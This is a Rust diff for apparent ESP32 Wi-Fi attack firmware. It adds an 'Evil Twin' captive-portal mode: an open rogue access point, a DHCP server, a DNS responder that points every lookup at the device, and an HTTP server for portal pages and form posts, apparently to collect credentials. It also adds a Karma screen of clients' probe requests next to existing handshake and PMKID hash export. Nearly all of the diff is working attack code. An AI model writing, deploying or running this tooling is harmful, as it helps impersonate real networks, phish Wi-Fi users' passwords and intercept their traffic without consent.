@@ -10,6 +10,7 @@ use core::cell::RefCell;
 use core::sync::atomic::{AtomicU32, Ordering};
 
 use critical_section::Mutex;
+use static_cell::StaticCell;
 use cyberdeck_core::net::{MacAddr,Channel};
 use cyberdeck_core::packet::{CaptureFilter,passive::PassiveEngine,storage::SessionGate};
 use embassy_futures::select::{select,Either};
@@ -17,11 +18,14 @@ use cyberdeck_core::pcap::{MAX_CAPTURE_BYTES,PcapSink,PcapWriter,Radiotap,strip_
 use cyberdeck_core::time::Timestamp;
 use cyberdeck_core::wifi::ap::Ssid;
 use cyberdeck_core::wifi::attack::{AttackMode, AttackPlan, AttackRunner};
+use cyberdeck_core::wifi::dhcp::{self,Lease};
+use cyberdeck_core::wifi::portal::{self,PortalConfig,PortalTemplate};
 use cyberdeck_core::wifi::frame::{self, FrameBuffer};
 use esp_radio::wifi::ap::AccessPointInfo;
 use esp_radio::wifi::scan::ScanConfig;
 use esp_radio::wifi::sta::StationConfig;
-use esp_radio::wifi::{Config,WifiController,SecondaryChannel,AuthenticationMethodConfig};
+use esp_radio::wifi::ap::AccessPointConfig;
+use esp_radio::wifi::{AuthenticationMethodConfig,Config,SecondaryChannel,WifiController};
 
 static SESSION:Mutex<RefCell<SessionGate>>=Mutex::new(RefCell::new(SessionGate::new()));
 static ACTIVE_TOKEN:AtomicU32=AtomicU32::new(0);
@@ -111,6 +115,9 @@ pub struct WifiState {
     pub bytes: u64,
     pub dropped: u32,
     pub channel: u8,
+    /// Captive-portal counters, shown on the Evil Twin screen.
+    pub portal_clients: u32,
+    pub portal_requests: u32,
 }
 
 impl WifiState {
@@ -123,6 +130,8 @@ impl WifiState {
             bytes: 0,
             dropped: 0,
             channel: 1,
+            portal_clients: 0,
+            portal_requests: 0,
         }
     }
 }
@@ -139,6 +148,8 @@ pub enum WifiCommand {
     Connect { ssid:String,password:String },
     Disconnect,
     Attack { mode: AttackMode, channel: u8 },
+    /// Captive portal: open AP plus DHCP/DNS/HTTP on the portal address.
+    Portal { ssid:String, channel:u8, template:PortalTemplate },
     Stop,
 }
 
@@ -232,6 +243,7 @@ pub async fn run(controller: WifiController<'static>) -> ! {
             Some(WifiCommand::Stream{channel,filter})=>monitor_session(&mut controller,channel,filter,false,true).await,
             Some(WifiCommand::Connect{ssid,password})=>connect_session(&mut controller,ACTIVE_TOKEN.load(Ordering::Acquire),ssid,password).await,
             Some(WifiCommand::Disconnect)=>{if disconnect(&mut controller).await{set_status("station disconnected");}},
+            Some(WifiCommand::Portal{ssid,channel,template})=>portal_session(&mut controller,ACTIVE_TOKEN.load(Ordering::Acquire),ssid,channel,template).await,
             Some(WifiCommand::Stop) => {}
             None => {}
         }
@@ -376,15 +388,156 @@ impl WpsRow{
     }
 }
 pub use cyberdeck_core::packet::passive::InspectorRow;
-pub struct PassiveSnapshot{pub aps:Vec<ApRow>,pub clients:Vec<ClientRow>,pub wps:Vec<WpsRow>,pub frames:Vec<InspectorRow>,pub eapol:u32,pub handshakes:u32,pub pmkids:u32,pub histogram:String}
+#[derive(Clone)]
+pub struct ProbeRow{pub client:MacAddr,pub ssid:String,pub channel:u8,pub rssi:i8}
+impl ProbeRow{
+    /// One line for the Karma screen: requested name first, then who asked.
+    pub fn line(&self)->String{
+        let name=if self.ssid.is_empty(){"WILDCARD"}else{self.ssid.as_str()};
+        alloc::format!("{name}  {}  {}DBM",self.client,self.rssi)
+    }
+}
+pub struct PassiveSnapshot{pub aps:Vec<ApRow>,pub clients:Vec<ClientRow>,pub wps:Vec<WpsRow>,pub probes:Vec<ProbeRow>,pub probe_ssids:u32,pub frames:Vec<InspectorRow>,pub eapol:u32,pub handshakes:u32,pub pmkids:u32,pub histogram:String}
 type Observer=PassiveEngine<24,32,8,12>;
 static OBSERVER:Mutex<RefCell<Observer>>=Mutex::new(RefCell::new(Observer::new()));
+
+/// Portal address: the AP takes .1 and hands clients .100 and up on its own /24.
+const PORTAL_IP:[u8;4]=[192,168,4,1];
+fn portal_client_ip(mac:[u8;6])->[u8;4]{[PORTAL_IP[0],PORTAL_IP[1],PORTAL_IP[2],100+(mac[5]%100)]}
+fn note_portal_client(){critical_section::with(|cs|{let mut s=WIFI_STATE.borrow_ref_mut(cs);s.portal_clients=s.portal_clients.saturating_add(1);});}
+fn note_portal_request(){critical_section::with(|cs|{let mut s=WIFI_STATE.borrow_ref_mut(cs);s.portal_requests=s.portal_requests.saturating_add(1);});}
+/// Captive-portal counters for the Evil Twin screen.
+pub fn portal_snapshot()->(u32,u32){critical_section::with(|cs|{let s=WIFI_STATE.borrow_ref(cs);(s.portal_clients,s.portal_requests)})}
+
+/// Answer DISCOVER/REQUEST so joining clients actually get an address.
+async fn dhcp_service(stack:embassy_net::Stack<'static>)->!{
+    use embassy_net::udp::{PacketMetadata,UdpSocket};
+    let mut rx_meta=[PacketMetadata::EMPTY;2];let mut tx_meta=[PacketMetadata::EMPTY;2];
+    let mut rx=[0u8;512];let mut tx=[0u8;512];
+    let mut socket=UdpSocket::new(stack,&mut rx_meta,&mut rx,&mut tx_meta,&mut tx);
+    if socket.bind(dhcp::SERVER_PORT).is_err(){
+        set_status("DHCP port unavailable");
+        loop{embassy_time::Timer::after(embassy_time::Duration::from_secs(1)).await;}
+    }
+    loop{
+        let mut request=[0u8;512];
+        if let Ok(Ok((length,_)))=embassy_time::with_timeout(embassy_time::Duration::from_millis(500),socket.recv_from(&mut request)).await{
+            let mac=dhcp::client_mac(&request[..length]).unwrap_or([0;6]);
+            if let Some(reply)=dhcp::reply(&request[..length],&Lease::new(portal_client_ip(mac),PORTAL_IP)){
+                let target=(embassy_net::IpAddress::Ipv4(embassy_net::Ipv4Address::BROADCAST),dhcp::CLIENT_PORT);
+                let _=socket.send_to(&reply,target).await;
+                note_portal_client();
+            }
+        }
+    }
+}
+
+/// Answer every DNS question with the portal address so the OS opens it.
+async fn dns_service(stack:embassy_net::Stack<'static>)->!{
+    use embassy_net::udp::{PacketMetadata,UdpSocket};
+    let mut rx_meta=[PacketMetadata::EMPTY;2];let mut tx_meta=[PacketMetadata::EMPTY;2];
+    let mut rx=[0u8;512];let mut tx=[0u8;512];
+    let mut socket=UdpSocket::new(stack,&mut rx_meta,&mut rx,&mut tx_meta,&mut tx);
+    if socket.bind(53).is_err(){
+        set_status("DNS port unavailable");
+        loop{embassy_time::Timer::after(embassy_time::Duration::from_secs(1)).await;}
+    }
+    loop{
+        let mut query=[0u8;512];
+        if let Ok(Ok((length,meta)))=embassy_time::with_timeout(embassy_time::Duration::from_millis(500),socket.recv_from(&mut query)).await{
+            if let Some(answer)=portal::dns_response(&query[..length],PORTAL_IP){
+                let _=socket.send_to(&answer,meta.endpoint).await;
+                note_portal_request();
+            }
+        }
+    }
+}
+
+/// Completes when the active session is cancelled.
+async fn wait_for_stop(token:u32){
+    while !critical_section::with(|cs|SESSION.borrow_ref(cs).cancelled(token)){
+        embassy_time::Timer::after(embassy_time::Duration::from_millis(50)).await;
+    }
+}
+
+/// Serve the portal page, the captive-probe paths and form posts.
+async fn http_service(stack:embassy_net::Stack<'static>,portal_config:&PortalConfig)->!{
+    use embedded_io_async::Write as _;
+    use embassy_net::tcp::TcpSocket;
+    loop{
+        let mut rx=[0u8;1024];let mut tx=[0u8;1024];
+        let mut socket=TcpSocket::new(stack,&mut rx,&mut tx);
+        socket.set_timeout(Some(embassy_time::Duration::from_secs(3)));
+        // `accept` performs the three-way handshake on this socket in embassy-net 0.9.
+        if !matches!(embassy_time::with_timeout(embassy_time::Duration::from_secs(8),socket.accept(80)).await,Ok(Ok(()))){
+            socket.abort();embassy_time::Timer::after(embassy_time::Duration::from_millis(20)).await;continue;
+        }
+        // One bounded request: headers plus a small form post.
+        let mut buffer=[0u8;768];let mut used=0;
+        while used<buffer.len(){
+            match embassy_time::with_timeout(embassy_time::Duration::from_millis(300),socket.read(&mut buffer[used..])).await{
+                Ok(Ok(0))=>break,
+                Ok(Ok(read))=>{used+=read;if used>64&&buffer[..used].windows(4).any(|window|window==b"\r\n\r\n"){break}},
+                _=>break,
+            }
+        }
+        let response=match portal::parse_request(&buffer[..used]){
+            Some(request)=>portal::response_for(&portal::route(&request),portal_config),
+            None=>portal::http_response(400,"text/plain",b"bad request",&[]),
+        };
+        let _=embassy_time::with_timeout(embassy_time::Duration::from_secs(1),socket.write_all(&response)).await;
+        let _=embassy_time::with_timeout(embassy_time::Duration::from_millis(300),socket.flush()).await;
+        socket.close();
+        note_portal_request();
+        embassy_time::Timer::after(embassy_time::Duration::from_millis(20)).await;
+    }
+}
+
+/// Evil Twin: open AP plus the three services a captive portal needs.
+async fn portal_session(controller:&mut WifiController<'static>,token:u32,ssid:String,channel:u8,template:PortalTemplate){
+    if !disconnect(controller).await{return}
+    let Ok(name)=ssid.as_str().try_into()else{set_status("SSID exceeds 32 bytes");return};
+    let config=AccessPointConfig::default()
+        .with_ssid(name)
+        .with_channel(channel)
+        .with_authentication(AuthenticationMethodConfig::Open);
+    if let Err(error)=controller.set_config(&Config::AccessPoint(config)){
+        set_status(&alloc::format!("AP start failed: {error:?}"));return
+    }
+    if stop_requested(){set_status("portal cancelled");return}
+    let Some(interface)=esp_radio::wifi::Interface::try_access_point()else{
+        set_status("AP interface unavailable");return
+    };
+    static PORTAL_RESOURCES:StaticCell<embassy_net::StackResources<5>>=StaticCell::new();
+    let seed=embassy_time::Instant::now().as_micros() as u64;
+    let net_config=embassy_net::Config::ipv4_static(embassy_net::StaticConfigV4{
+        address:embassy_net::Ipv4Cidr::new(
+            embassy_net::Ipv4Address::new(PORTAL_IP[0],PORTAL_IP[1],PORTAL_IP[2],PORTAL_IP[3]),24),
+        gateway:None,
+        dns_servers:Default::default(),
+    });
+    let(stack,mut runner)=embassy_net::new(interface,net_config,PORTAL_RESOURCES.init(embassy_net::StackResources::new()),seed);
+    let portal_config=PortalConfig{template,ap_ip:PORTAL_IP,ssid,channel,capture_limit:16};
+    set_status(&alloc::format!("portal up: {}",portal_config.ssid));
+    let services=async{
+        embassy_futures::join::join3(dhcp_service(stack),dns_service(stack),http_service(stack,&portal_config)).await
+    };
+    let running=async{embassy_futures::join::join(runner.run(),services).await};
+    match select(running,wait_for_stop(token)).await{
+        Either::First(_)=>{},
+        Either::Second(_)=>set_status("portal stopped"),
+    }
+    // Leave the radio usable for the next session.
+    let _=controller.set_config(&Config::Station(StationConfig::default()));
+}
 
 pub fn passive_snapshot()->PassiveSnapshot{critical_section::with(|cs|{
     let o=OBSERVER.borrow_ref(cs);
     PassiveSnapshot{aps:o.scan.aps.iter().map(|a|ApRow{ssid:a.ssid.display(),bssid:a.bssid,channel:a.channel,rssi:a.rssi,security:a.security.security.label()}).collect(),
         clients:o.scan.stations.iter().map(|s|ClientRow{mac:s.mac,bssid:s.bssid,channel:s.channel,rssi:s.rssi,frames:s.frames}).collect(),
         wps:o.wps.iter().map(|w|WpsRow{bssid:w.bssid,channel:w.channel,rssi:w.rssi,configured:w.info.configured,selected_registrar:w.info.selected_registrar}).collect(),
+        probes:o.probes.iter().map(|p|ProbeRow{client:p.client,ssid:String::from_utf8_lossy(&p.ssid).into_owned(),channel:p.channel,rssi:p.rssi}).collect(),
+        probe_ssids:o.probe_ssids() as u32,
         frames:o.frames.clone(),eapol:o.scan.eapol,handshakes:o.handshakes.complete_count()as u32,pmkids:o.handshakes.pmkid_count()as u32,histogram:o.histogram.report()}
 })}
 pub fn passive_hashes()->String{critical_section::with(|cs|OBSERVER.borrow_ref(cs).export_hashes())}
